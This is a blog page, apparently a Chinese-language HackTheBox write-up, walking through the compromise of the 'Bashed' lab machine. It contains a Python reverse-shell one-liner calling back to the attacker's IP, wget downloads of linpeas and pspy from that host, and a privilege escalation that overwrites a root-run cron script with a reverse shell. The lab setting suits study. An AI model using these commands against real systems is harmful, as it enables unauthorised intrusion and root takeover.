@@ -1,0 +1,332 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    kaia
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="kaia" />
+    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">Kaia</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        <a class="category-link" href="/categories/binary-security/">binary security</a></li><li><a class="category-link" href="/categories/hackthebox/">hackthebox</a>
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://github.com/puzzzz" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url(/gallery/thumbnail/htb_socialmedia_cover.png);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >Bashed</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h1 id="Bashed"><a href="#Bashed" class="headerlink" title="Bashed"></a>Bashed</h1><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> nmap -T4 -Pn -A -sV -vv -sS --script<span class="token operator">=</span>vuln -p- 10.10.10.68
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>扫描结果，只有80端口开放</p>
+<p><img src="/2022/10/03/Bashed/image/image_vhYXdfNoVz.png"></p>
+<h3 id="访问http-x2F-x2F-10-10-10-68"><a href="#访问http-x2F-x2F-10-10-10-68" class="headerlink" title="访问http:&#x2F;&#x2F;10.10.10.68"></a>访问http:&#x2F;&#x2F;10.10.10.68</h3><p><img src="/2022/10/03/Bashed/image/image_GIbfTFNT4d.png"></p>
+<p>发现项目地址</p>
+<pre class="line-numbers language-bash"><code class="language-bash">https://github.com/Arrexel/phpbash
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2022/10/03/Bashed/image/image_sRsBcEPw22.png"></p>
+<p><img src="/2022/10/03/Bashed/image/image_3ENrH-HNF-.png"></p>
+<p>关键信息，找到这两个文件的路径</p>
+<pre class="line-numbers language-bash"><code class="language-bash">phpbash.min.php
+phpbash.php
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>F12看一下源码</p>
+<p>图片路径存在目录遍历，不过没发现敏感信息</p>
+<p><img src="/2022/10/03/Bashed/image/image_I93z1aUHIZ.png"></p>
+<h3 id="扫描web路径"><a href="#扫描web路径" class="headerlink" title="扫描web路径"></a>扫描web路径</h3><p>dirb  （这个不好用，特别慢）</p>
+<p><img src="/2022/10/03/Bashed/image/image_AAcrXXMzQV.png"></p>
+<p>推荐使用Dirbuster，支持多线程</p>
+<p><img src="/2022/10/03/Bashed/image/image_Z1D2dFqwFH.png"></p>
+<p>发现dev路径，发现关键文件</p>
+<p><img src="/2022/10/03/Bashed/image/image_076AVfIMvP.png"></p>
+<p>访问，直接获得交互式shell，但是权限较低，后面要提权</p>
+<pre class="line-numbers language-bash"><code class="language-bash">http://10.10.10.68/dev/phpbash.php
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>先获取一个flag</p>
+<p><img src="/2022/10/03/Bashed/image/image_hC2KUbLf9t.png"></p>
+<h3 id="反弹交互式shell"><a href="#反弹交互式shell" class="headerlink" title="反弹交互式shell"></a>反弹交互式shell</h3><p>本地监听</p>
+<pre class="line-numbers language-bash"><code class="language-bash">nc -lvp 23333
+
+<span class="token comment" spellcheck="true">#这里试了下端口号比较小好像会断（6666，7777），不知道什么原因</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>靶机执行</p>
+<pre class="line-numbers language-bash"><code class="language-bash">python -c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect<span class="token variable"><span class="token punctuation">((</span>"<span class="token number">10.10</span>.<span class="token number">14.2</span>"<span class="token punctuation">,</span><span class="token number">23333</span><span class="token punctuation">))</span></span>;os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2022/10/03/Bashed/image/image_OlFVaGuRQg.png"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>下载linux提权检测脚本到本地</p>
+<pre class="line-numbers language-bash"><code class="language-bash">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS/builder
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="本地监听80，靶机下载提权文件检测脚本"><a href="#本地监听80，靶机下载提权文件检测脚本" class="headerlink" title="本地监听80，靶机下载提权文件检测脚本"></a>本地监听80，靶机下载提权文件检测脚本</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> -P /tmp http://10.10.14.2/linpeas.sh
+
+<span class="token function">chmod</span> 777 linpeas.sh
+
+./linpeas.sh
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2022/10/03/Bashed/image/image_m0GH3V5jDx.png"></p>
+<p>发现该用户可直接登录</p>
+<pre class="line-numbers language-bash"><code class="language-bash">scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#执行</span>
+<span class="token function">sudo</span> -u scriptmanager /bin/bash
+
+<span class="token comment" spellcheck="true">#升级交互式shel</span>
+python -c <span class="token string">'import pty; pty.spawn("/bin/bash")'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2022/10/03/Bashed/image/image_Q7ztpo5W5o.png"></p>
+<p>再执行一下提权检测脚本</p>
+<p>检测到这个py文件当前用户拥有读写权限。</p>
+<pre class="line-numbers language-bash"><code class="language-bash">/scripts/test.py
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2022/10/03/Bashed/image/image_abujlpyrzx.png"></p>
+<h3 id="使用pspy监听一下进程的执行情况"><a href="#使用pspy监听一下进程的执行情况" class="headerlink" title="使用pspy监听一下进程的执行情况"></a>使用pspy监听一下进程的执行情况</h3><pre class="line-numbers language-bash"><code class="language-bash">https://github.com/DominicBreuker/pspy
+
+
+<span class="token function">wget</span> -P /tmp/ http://10.10.14.2/pspy32
+
+<span class="token function">chmod</span> 777 pspy32
+
+./pspy32
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/2022/10/03/Bashed/image/image_5euiwkyD11.png"></p>
+<p>发现test.py是root(uid&#x3D;0)在执行，同时当前用户可以读写test.py</p>
+<p><img src="/2022/10/03/Bashed/image/image_mS3mPec8i_.png"></p>
+<p>直接改写test.py内容为反弹shell，root执行test.py时就会把root权限的shell反弹回来。</p>
+<p>本地监听另外一个端口</p>
+<p><img src="/2022/10/03/Bashed/image/image_uDRpB6krl5.png"></p>
+<h3 id="改写test-py"><a href="#改写test-py" class="headerlink" title="改写test.py"></a>改写test.py</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect<span class="token variable"><span class="token punctuation">((</span>"<span class="token number">10.10</span>.<span class="token number">14.2</span>"<span class="token punctuation">,</span><span class="token number">23334</span><span class="token punctuation">))</span></span>;os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span class="token operator">></span>/scripts/test.py
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="等待一分钟获得root权限shell"><a href="#等待一分钟获得root权限shell" class="headerlink" title="等待一分钟获得root权限shell"></a>等待一分钟获得root权限shell</h3><p><img src="/2022/10/03/Bashed/image/image_xupiWv_6SJ.png"></p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'kaiasec'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://example.com/2022/10/03/Bashed/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://example.com/2022/10/03/Bashed/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//kaiasec.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a target="_blank" rel="noopener" href="https://github.com/miccall/hexo-theme-Mic_Theme " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+
+    </div>
+</body>
+
+
+
+ 	
+</html>
